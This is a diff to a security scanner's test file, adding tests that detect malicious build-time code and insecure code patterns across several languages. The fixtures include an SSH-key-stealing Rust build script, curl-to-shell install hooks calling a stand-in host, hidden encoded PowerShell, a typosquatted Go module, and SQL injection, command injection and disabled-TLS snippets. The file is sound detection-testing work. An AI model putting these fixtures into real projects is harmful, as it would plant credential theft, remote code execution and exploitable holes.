@@ -271,6 +271,62 @@ test("diff mode reads only changed files; gitignored output is skipped", async (
   assert.deepEqual(diff.findings.filter(f => f.rule === "mal-eval-decoded").map(f => f.file), ["new.js"]);
 });
 
+test("build and install time code in Rust, Go, Ruby, PHP, .NET and JVM projects", async () => {
+  const bad = {
+    "rust-build-script": { "build.rs": j("use std::process::Command;\nfn main() {\n  let k = std::fs::read_to_string(dirs::home_dir().unwrap().join(\".ss", "h/id_rsa\"));\n  ureq::post(\"https://x.example/k\").send_string(&k.unwrap());\n}\n") },
+    "rust-proc-macro-side-effects": { "src/lib.rs": "#[proc_macro_derive(Thing)]\npub fn derive(i: TokenStream) -> TokenStream {\n  std::process::Command::new(\"sh\").arg(\"-c\").arg(\"id\").output().ok();\n  i\n}\n" },
+    "go-generate-download": { "gen.go": j("package x\n\n//go:generate sh -c \"cu", "rl -s https://x.example/g.sh | sh\"\n") },
+    "go-init-side-effects": { "lib/util.go": "package util\n\nimport \"os/exec\"\n\nfunc init() {\n\texec.Command(\"/bin/sh\", \"-c\", \"id\").Run()\n}\n" },
+    "go-mod-replace-remote": { "go.mod": "module example.com/app\n\ngo 1.22\n\nreplace github.com/gin-gonic/gin v1.10.0 => github.com/gin-gonlc/gin v1.10.0\n" },
+    "ruby-extension-script": { "ext/foo/extconf.rb": j("require 'mkmf'\nsystem('cu", "rl -s https://x.example/p | sh')\ncreate_makefile('foo')\n") },
+    "composer-script-suspicious": { "composer.json": JSON.stringify({ name: "a/b", scripts: { "post-install-cmd": [j("cu", "rl -s https://x.example/p.sh | bash")] } }) },
+    "msbuild-exec-suspicious": { "App.vcxproj": j("<Project><ItemDefinitionGroup><PreBuildEvent><Command>powershell -w hidden -en", "c SQBFAFgA</Command></PreBuildEvent></ItemDefinitionGroup></Project>\n").replace("<Command>", "").replace("</Command>", "") },
+    "msbuild-inline-task": { "Build.targets": "<Project><UsingTask TaskName=\"X\" TaskFactory=\"RoslynCodeTaskFactory\" AssemblyFile=\"$(MSBuildToolsPath)\\Microsoft.Build.Tasks.Core.dll\" /></Project>\n" },
+    "gradle-build-exec": { "build.gradle": j("task setup {\n  doLast {\n    exec { commandLine 'bash', '-c', 'cu", "rl -s https://x.example/s.sh | bash' }\n  }\n}\n") },
+    "gradle-wrapper-source": { "gradle/wrapper/gradle-wrapper.properties": "distributionUrl=https\\://gradle-mirror.example.net/gradle-8.10-bin.zip\n" },
+    "jvm-insecure-repository": { "pom.xml": "<project><repositories><repository><url>http://repo.example.net/maven</url></repository></repositories></project>\n" },
+  };
+  for (const [id, files] of Object.entries(bad)) assert.ok(rules(await run(project(files), { noIgnore: true })).has(id), id);
+
+  const good = await run(project({
+    "build.rs": "fn main() {\n  cc::Build::new().file(\"src/c/lib.c\").compile(\"lib\");\n  println!(\"cargo:rerun-if-changed=src/c/lib.c\");\n}\n",
+    "macros/src/lib.rs": "#[proc_macro_derive(Thing)]\npub fn derive(i: TokenStream) -> TokenStream { quote!(impl Thing for X {}).into() }\n",
+    "gen.go": "package x\n\n//go:generate stringer -type=Color\n//go:generate go run ./internal/gen\n",
+    "lib/reg.go": "package reg\n\nfunc init() {\n\tRegister(\"json\", jsonCodec{})\n}\n",
+    "go.mod": "module example.com/app\n\nreplace example.com/app/internal => ./internal\nreplace golang.org/x/net v0.1.0 => golang.org/x/net v0.2.0\n",
+    "ext/foo/extconf.rb": "require 'mkmf'\nhave_header('zlib.h')\ncreate_makefile('foo')\n",
+    "composer.json": JSON.stringify({ name: "a/b", scripts: { "post-install-cmd": ["@php artisan key:generate", "php -r \"copy('.env.example', '.env');\""] } }),
+    "App.csproj": "<Project><Target Name=\"Ts\" BeforeTargets=\"Build\"><Exec Command=\"npm run build\" /></Target></Project>\n",
+    "build.gradle": "plugins { id 'java' }\ntask ver { doLast { exec { commandLine 'git', 'describe', '--tags' } } }\nrepositories { mavenCentral() }\n",
+    "gradle/wrapper/gradle-wrapper.properties": "distributionUrl=https\\://services.gradle.org/distributions/gradle-8.10-bin.zip\n",
+  }), { noIgnore: true });
+  assert.deepEqual(good.findings.filter(f => Object.keys(bad).includes(f.rule) || f.rule === "rust-build-script-network").map(f => `${f.rule} ${f.file}`), []);
+});
+
+test("vulnerabilities in Java/Kotlin, C#, Ruby, Go and Rust", async () => {
+  const r = await run(project({
+    "Repo.java": "String q = \"SELECT * FROM users WHERE id = \" + id;\nstmt.executeQuery(\"SELECT * FROM users WHERE name = '\" + name + \"'\");\nRuntime.getRuntime().exec(\"convert \" + file);\nmapper.enableDefaultTyping();\nHostnameVerifier hv = (h, s) -> true;\nnew File(base, request.getParameter(\"f\"));\nhttp.csrf().disable();\n",
+    "Repo.kt": "jdbc.queryForList(\"SELECT * FROM t WHERE a = $a\")\n",
+    "Db.cs": "var cmd = new SqlCommand($\"SELECT * FROM Users WHERE Name = '{name}'\", conn);\nvar f = new BinaryFormatter();\nhandler.ServerCertificateCustomValidationCallback = (m, c, ch, e) => true;\nsettings.DtdProcessing = DtdProcessing.Parse;\n",
+    "users_controller.rb": "User.where(\"name = '#{params[:name]}'\")\nsystem(\"convert #{params[:file]} out.png\")\nobj = Marshal.load(data)\nparams[:type].constantize\n@user.update(params.permit!)\n",
+    "main.go": "q := fmt.Sprintf(\"SELECT * FROM t WHERE id = %s\", id)\ntls := &tls.Config{InsecureSkipVerify: true}\nexec.Command(\"sh\", \"-c\", \"ls \" + dir)\n",
+    "db.rs": "sqlx::query(&format!(\"SELECT * FROM t WHERE id = {}\", id)).fetch_all(&pool).await?;\nreqwest::Client::builder().danger_accept_invalid_certs(true);\n",
+  }));
+  const got = new Set(r.findings.map(f => `${f.file} ${f.rule}`));
+  for (const k of ["Repo.java sql-concat", "Repo.java cmd-injection", "Repo.java deserialize-unsafe", "Repo.java tls-verify-off", "Repo.java path-traversal", "Repo.java csrf-disabled", "Repo.kt sql-concat",
+    "Db.cs sql-concat", "Db.cs deserialize-unsafe", "Db.cs tls-verify-off", "Db.cs xxe", "users_controller.rb sql-concat", "users_controller.rb cmd-injection", "users_controller.rb deserialize-unsafe",
+    "users_controller.rb code-eval-input", "users_controller.rb mass-assignment", "main.go sql-concat", "main.go tls-verify-off", "main.go cmd-injection", "db.rs sql-concat", "db.rs tls-verify-off"]) assert.ok(got.has(k), k);
+
+  const clean = await run(project({
+    "Repo.java": "PreparedStatement ps = conn.prepareStatement(\"SELECT * FROM users WHERE id = ?\");\nnew ProcessBuilder(\"git\", \"status\").start();\n",
+    "Db.cs": "var cmd = new SqlCommand(\"SELECT * FROM Users WHERE Name = @name\", conn);\ndb.Users.FromSqlInterpolated($\"SELECT * FROM Users WHERE Id = {id}\");\n",
+    "users_controller.rb": "User.where(name: params[:name])\nsystem(\"convert\", params[:file], \"out.png\")\nparams.require(:user).permit(:name)\n",
+    "main.go": "db.Query(\"SELECT * FROM t WHERE id = $1\", id)\nexec.Command(\"git\", \"status\")\n",
+    "db.rs": "sqlx::query(\"SELECT * FROM t WHERE id = $1\").bind(id);\n",
+  }));
+  assert.deepEqual(clean.findings.filter(f => f.category === "web" && f.severity !== "info").map(f => `${f.file} ${f.rule}`), []);
+});
+
 test("GitHub review: changed lines block, findings already in the file are only listed", () => {
   const dir = project({ "app.js": j("const a = 1;\neval(at", "ob(old));\n"), "README.md": "hi\n" });
   const git = (...a) => spawnSync("git", a, { cwd: dir, encoding: "utf8" });
